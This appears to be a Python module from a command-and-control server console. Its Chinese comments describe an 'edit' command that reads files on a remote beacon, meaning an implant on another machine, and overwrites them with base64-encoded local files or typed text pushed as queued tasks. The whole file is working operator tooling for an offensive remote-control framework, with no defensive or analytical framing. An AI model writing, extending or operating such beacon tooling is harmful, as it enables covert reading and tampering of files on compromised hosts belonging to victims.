"""edit — 文件编辑(拉读 / 推写):

edit <beacon_id> <remote_path>                读文件(带行号)
edit <beacon_id> <remote_path> <@local_file>  本地文件内容推写(整文件替换)
edit <beacon_id> <remote_path> <文本内容...>   直接文本推写(空格拼接)

推写时自动 base64 编码后走 edit 模块写模式; 读模式返回带行号内容。
"""

import base64
import os

from server.task_queue import Task


def run(disp, args):
    if len(args) < 2:
        return ("[!] usage: edit <beacon_id> <remote_path> "
                "[@local_file | 文本内容...]")
    bid, rest = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon"
    path = rest[0]
    try:
        if len(rest) >= 2:
            payload = rest[1]
            if payload.startswith("@"):
                # 本地文件推写
                local = payload[1:]
                try:
                    with open(local, "rb") as f:
                        data = f.read()
                except OSError as e:
                    return f"[!] {e}"
                src = f"本地文件 {local}"
            else:
                # 直接文本(空格拼接)
                data = " ".join(rest[1:]).encode("utf-8")
                src = "直接文本"
            b64 = base64.b64encode(data).decode("ascii")
            task = disp.build_task("edit", [path, b64])
            if task is None:
                return "[!] unknown module: edit"
            r = disp.push_task(bid, task)
            return f"[+] 推写({src}, {len(data)} 字节) → {bid}:{path}\n{r}"
        # 读模式
        task = disp.build_task("edit", [path])
        if task is None:
            return "[!] unknown module: edit"
        return disp.push_task(bid, task)
    except ValueError as e:
        return f"[!] {e}"
